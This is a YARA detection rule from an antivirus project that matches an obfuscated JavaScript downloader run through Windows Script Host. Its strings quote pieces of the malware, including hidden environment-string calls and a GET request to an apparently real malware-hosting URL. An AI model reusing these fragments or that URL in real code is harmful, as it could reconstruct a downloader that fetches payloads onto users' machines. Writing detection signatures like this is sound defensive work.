rule sig_20160428_b7bae9be93d5a7f96e69cf9945a09c2e {
  meta:
    description = "datamaliciousorder - file 20160428_b7bae9be93d5a7f96e69cf9945a09c2e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "186bc041a715ab76b80bc859aaa4b3d40fa32fa98cd0cd8b6472ef95491ab3dd"

  strings:
    $s1  = "function EbfNsyLhmGedIeoPjyYif() {return MauRrpIgaTwzNhhOxkGho[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function VvbJjzZouHuuOrjBhpKpn(IzxQdtDziSmbFmwKrlLmm){MauRrpIgaTwzNhhOxkGho[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function VvbJjzZouHuuOrjBhpKpn(IzxQdtDziSmbFmwKrlLmm){MauRrpIgaTwzNhhOxkGho[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "var MauRrpIgaTwzNhhOxkGho = function HzsFebVtuAdaYgkGvvSsb() {return XwmSojUkhYojDebLhoGsa[RqzDzhLcqAhuYnkUaiTzd](\"WScript\"+\"" ascii
    $s5  = "function UoqNldFqnKvtReePjtGnz(BbrWqhVphNpxUzaEqdJok, WyjNcuFuuFfzEhnYdxRtj){GcuCegBncRxsGfkXqdOia = GcuCegBncRxsGfkXqdOia * 1; " ascii
    $s6  = "return BbrWqhVphNpxUzaEqdJok - WyjNcuFuuFfzEhnYdxRtj;};" fullword ascii
    $s7  = "GouNmxLluDtjRrvKzeTbd[VeqZpaPopImlUbfSygVky](\"G\" + \"ET\", \"http://holy.webtm.ru/o4ksla\", false);" fullword ascii
    $s8  = "var MauRrpIgaTwzNhhOxkGho = function HzsFebVtuAdaYgkGvvSsb() {return XwmSojUkhYojDebLhoGsa[RqzDzhLcqAhuYnkUaiTzd](\"WScript\"+\"" ascii
    $s9  = "var XwmSojUkhYojDebLhoGsa = this[\"WScript\"];" fullword ascii
    $s10 = "function EbfNsyLhmGedIeoPjyYif() {return MauRrpIgaTwzNhhOxkGho[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function UoqNldFqnKvtReePjtGnz(BbrWqhVphNpxUzaEqdJok, WyjNcuFuuFfzEhnYdxRtj){GcuCegBncRxsGfkXqdOia = GcuCegBncRxsGfkXqdOia * 1; " ascii
    $s12 = "if (GouNmxLluDtjRrvKzeTbd[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function PcxNmtFpsOayOdqInlYuc() {return ((LswCuvJugMjcUxeSqmBiy == true) && (LswCuvJugMjcUxeSqmBiy == SwfRbtJgqDvvMuuLoyFqt)) ?" ascii
    $s14 = "function PcxNmtFpsOayOdqInlYuc() {return ((LswCuvJugMjcUxeSqmBiy == true) && (LswCuvJugMjcUxeSqmBiy == SwfRbtJgqDvvMuuLoyFqt)) ?" ascii
    $s15 = "function VtaKxuFypKreJlaWrvQyz(CvpQdnRrzEwiPecFrvYed) {var NtuFahQcfEcwTmuObfLzk = (1, 2, 3, 4, 5, CvpQdnRrzEwiPecFrvYed); retur" ascii
    $s16 = "}while (PlxOxpKxiSjwCdgOxeLse);" fullword ascii
    $s17 = "var LswCuvJugMjcUxeSqmBiy = false;" fullword ascii
    $s18 = "var OlnQkzGlnYbzQcvSghPgy = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "function WxvBjkCrtNrbSzhIdzLrk(){return WpjTcaNfqRjuJyxOmpSck + \"\";};" fullword ascii
    $s20 = "NqxTnkCbfQwyLwbLcvZyx = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}